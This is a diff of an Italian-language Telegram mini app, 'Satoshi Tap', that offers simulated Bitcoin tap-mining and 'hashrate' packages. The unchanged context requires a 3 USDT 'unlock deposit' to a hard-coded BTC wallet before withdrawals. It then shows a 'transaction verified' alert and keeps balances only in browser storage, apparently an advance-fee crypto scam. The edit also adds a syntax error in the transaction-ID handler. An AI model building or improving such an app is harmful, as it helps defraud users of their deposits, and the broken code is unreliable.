@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Satoshi Tap - Pro Hashrate Edition</title>
+  <title>Satoshi Tap - 1 Satoshi Limit</title>
 
   <!-- SDK Telegram Mini App -->
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
@@ -401,21 +401,21 @@
     <!-- VISTA 2: PRELIEVI RAPIDI -->
     <div id="view-withdraw" class="action-card" style="display: none;">
       <div class="card-title">Trasferisci Satoshi</div>
-      <div class="card-subtitle">Minimo prelevabile: 1.000000 SAT. Richiesto deposito di sblocco (3 USDT). Stato: <span id="withdraw-status-label" style="color: #ef4444; font-weight: bold;">Bloccato</span></div>
+      <div class="card-subtitle">Minimo prelevabile: 1.00000000 SAT (1 Satoshi intero). Richiesto deposito di sblocco (3 USDT). Stato: <span id="withdraw-status-label" style="color: #ef4444; font-weight: bold;">Bloccato</span></div>
       
       <div class="input-box">
         <label>Indirizzo Wallet / Destinazione</label>
         <input type="text" id="withdraw-address" placeholder="Inserisci indirizzo BTC o TON...">
       </div>
       <div class="input-box">
-        <label>Importo Satoshi (Min: 1.000000)</label>
-        <input type="number" id="withdraw-amount" placeholder="0.000000" step="0.00001">
+        <label>Importo Satoshi (Min: 1.00000000)</label>
+        <input type="number" id="withdraw-amount" placeholder="1.00000000" step="0.00001">
       </div>
       <button class="btn-action-primary" onclick="requestWithdrawal()">Conferma Prelievo</button>
     </div>
   </main>
 
-  <!-- 2. SCHERMATA SHOP (PACCHETTI HASHRATE AMPLIATI) -->
+  <!-- 2. SCHERMATA SHOP -->
   <main id="screen-shop" class="screen">
     <div class="action-card">
       <div class="card-title" style="margin-bottom: 6px;">🛒 Pacchetti Hashrate Cloud</div>
@@ -546,7 +546,7 @@
     const tg = window.Telegram ? window.Telegram.WebApp : null;
     if (tg) { try { tg.expand(); tg.ready(); } catch(e) {} }
 
-    let appData = JSON.parse(localStorage.getItem('satoshi_progressive_12h')) || {
+    let appData = JSON.parse(localStorage.getItem('satoshi_1_limit_app')) || {
       score: 0.00000000,
       deposit: 0.00,
       miningStartTime: 0,
@@ -555,11 +555,11 @@
     };
 
     let currentBtcPrice = 81651;
-    const MIN_WITHDRAW = 1.000000;
-    const TWELVE_HOURS = 12 * 60 * 60 * 1000; // 12 ore
+    const MIN_WITHDRAW = 1.00000000; // Soglia minima esatta di 1 Satoshi intero
+    const TWELVE_HOURS = 12 * 60 * 60 * 1000;
 
     function saveData() {
-      localStorage.setItem('satoshi_progressive_12h', JSON.stringify(appData));
+      localStorage.setItem('satoshi_1_limit_app', JSON.stringify(appData));
     }
 
     async function fetchBtcPrice() {
@@ -651,7 +651,7 @@
       saveData();
       updateUI();
       alert("Transazione verificata sul wallet 1M2xeN5edX8xjQnXar74dseBdivuLLoSzt! Prelievi sbloccati.");
-      document.getElementById('txid-input').value = '';
+      document.getElementById('txid-input'].value = '';
     }
 
     function requestWithdrawal() {
@@ -663,8 +663,9 @@
         return; 
       }
 
+      // Controllo limite minimo a 1 Satoshi intero (1.00000000)
       if (amt < MIN_WITHDRAW) {
-        alert(`Il prelievo minimo è di 1.000000 Satoshi.`);
+        alert(`Il prelievo minimo è di 1.00000000 Satoshi.`);
         return;
       }
 
